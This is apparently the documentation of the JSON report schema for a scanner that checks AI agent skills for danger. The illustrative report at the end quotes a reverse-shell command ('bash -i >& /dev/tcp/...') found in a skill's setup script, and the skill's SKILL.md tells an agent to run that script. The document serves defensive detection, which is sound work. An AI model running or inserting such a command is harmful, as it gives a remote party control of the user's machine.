# Report Schema

Every scan returns a `ScanReport`, serialized as JSON by `report.to_json()` and by the REST API.

```json
{
  "skill": { ... },
  "risk_assessment": { ... },
  "components": [ ... ],
  "issues": [ ... ],
  "overall_assessment": { ... } | null,
  "metadata": { ... },
  "execution_successful": true
}
```

## `skill`

| Field | Type | Description |
| --- | --- | --- |
| `name` | string | `name:` from `SKILL.md` frontmatter if present, otherwise the directory, file, or request name |
| `source` | string | The scanned path or URL, or the `source` / `name` passed to `scan_files` |
| `scanned_at` | string (ISO 8601, UTC) | When the report was created |

## `risk_assessment`

| Field | Type | Description |
| --- | --- | --- |
| `score` | integer 0-100 | Aggregate risk. See [Scoring and Verdicts](scoring-and-verdicts.md). |
| `severity` | `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` | Band for the score |
| `recommendation` | `SAFE` \| `CAUTION` \| `DO_NOT_INSTALL` | Static recommendation for the band |
| `max_issue_severity` | `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` \| `NONE` | Severity of the single worst issue |

`severity` is confidence-weighted and aggregated; `max_issue_severity` is not. A report can read
`severity: MEDIUM` while containing a HIGH issue. Gate on both when in doubt.

## `components`

One entry per file considered.

| Field | Type | Description |
| --- | --- | --- |
| `path` | string | Path relative to the scanned root |
| `type` | string | `skill_manifest`, `script`, `documentation`, `config`, `other`, `binary`, or `oversized` |
| `lines` | integer \| null | Line count for text files |
| `executable` | boolean | Script extension, shebang, executable permission bit, or executable binary |
| `size_bytes` | integer | File size |

Issues located in executable components score 1.3x.

## `issues`

Sorted by severity (highest first), then file, then line.

| Field | Type | Description |
| --- | --- | --- |
| `id` | string | Rule ID (see [Detection Rules](detection-rules.md)); `SEM<n>` for agent findings |
| `finding_id` | string | Unique per finding, `finding-<32 hex>` |
| `category` | string \| null | For example `prompt_injection`, `malicious_link`, `obfuscation` |
| `pattern` | string \| null | Rule title; `Semantic review` for agent findings |
| `severity` | `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` | Issue severity |
| `confidence` | number 0-1 | Rule confidence, raised to the agent's confidence when confirmed |
| `location.file` | string | File path |
| `location.start_line` | integer | 1-based line |
| `location.end_line` | integer \| null | End line when known (agent findings) |
| `finding` | string \| null | Matched text, cleaned for display; secrets are redacted |
| `explanation` | string \| null | Rule title plus context (for example `(inside base64-decoded text)`), or the agent's explanation |
| `remediation` | string \| null | Category guidance, or the agent's remediation |
| `code_snippet` | string \| null | The source line containing the match, cleaned and redacted |
| `intent` | `malicious` \| `negligent` \| `benign` \| null | Set by the agent |
| `tags` | string[] | `llm-unconfirmed`: the agent did not confirm this static issue. `semantic`: found by the agent. |
| `evidence` | object | Extra data. `llm_judgment`: the agent's reasoning for an unconfirmed issue. |
| `match_fingerprint` | string \| null | SHA-256 of the rule ID and whitespace-normalized match; stable across scans, useful for baselines |

Display cleaning escapes invisible characters as `\uXXXX` and truncates evidence at 200 characters.

## `overall_assessment`

Present only when the agent review ran; otherwise `null`.

| Field | Type | Description |
| --- | --- | --- |
| `verdict` | `APPROVE` \| `CAUTION` \| `REJECT` | The agent's decision, after the approval guard |
| `risk_level` | `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` | The agent's overall risk level |
| `summary` | string | Bottom line: install or not, the main risk, and why |
| `install_posture` | string | Suitable and unsuitable use |
| `sensitive_surface` | string[] | Sensitive capabilities used, for example `network`, `shell`, `env` |
| `diagnosis` | string | How static evidence and semantic review lead to the verdict |
| `guardrails` | string[] | Conditions under which the skill may be used |

## `metadata`

| Field | Type | Description |
| --- | --- | --- |
| `has_executable_scripts` | boolean | Any executable component |
| `skills_scanner_version` | string | Package version |
| `llm_requested` | boolean | The agent review was requested |
| `llm_available` | boolean | The agent review ran and returned a valid result |
| `meta_analysis_applied` | boolean | The agent's judgments were merged into the issues |
| `model` | string \| null | Model used, when requested |
| `llm_error` | string \| null | Why the agent review did not complete |

`llm_requested: true` with `llm_available: false` means the report is static-only. Treat its verdict with
lower confidence and review the evidence manually.

## `execution_successful`

`true` when the scan completed. Scan errors (for example a missing target) raise exceptions in the
library and are not reported through this field.

## Example

An illustrative end-to-end report, abridged to one issue:

```json
{
  "skill": { "name": "pdf-helper", "source": "skills/pdf-helper", "scanned_at": "2026-09-28T10:00:00Z" },
  "risk_assessment": { "score": 100, "severity": "CRITICAL", "recommendation": "DO_NOT_INSTALL", "max_issue_severity": "CRITICAL" },
  "components": [
    { "path": "SKILL.md", "type": "skill_manifest", "lines": 11, "executable": false, "size_bytes": 812 },
    { "path": "scripts/setup.sh", "type": "script", "lines": 6, "executable": true, "size_bytes": 244 }
  ],
  "issues": [
    {
      "id": "DC001",
      "finding_id": "finding-5d0c9e0a8f7b4c43a1f2e9d6b7a8c3e1",
      "category": "dangerous_command",
      "pattern": "Reverse shell",
      "severity": "CRITICAL",
      "confidence": 0.97,
      "location": { "file": "scripts/setup.sh", "start_line": 4, "end_line": null },
      "finding": "bash -i >&",
      "explanation": "Opens an interactive shell to a remote host, giving it full control of the machine.",
      "remediation": "Remove the command.",
      "code_snippet": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "intent": "malicious",
      "tags": [],
      "evidence": {},
      "match_fingerprint": "3b7e..."
    }
  ],
  "overall_assessment": {
    "verdict": "REJECT",
    "risk_level": "CRITICAL",
    "summary": "Do not install. The skill claims to extract PDF text but its setup script opens a reverse shell.",
    "install_posture": "Not suitable for any environment.",
    "sensitive_surface": ["shell", "network"],
    "diagnosis": "The static reverse-shell finding is confirmed in scripts/setup.sh, which SKILL.md instructs the agent to run.",
    "guardrails": []
  },
  "metadata": {
    "has_executable_scripts": true,
    "skills_scanner_version": "0.1.0",
    "llm_requested": true,
    "llm_available": true,
    "meta_analysis_applied": true,
    "model": "claude-sonnet-5",
    "llm_error": null
  },
  "execution_successful": true
}
```
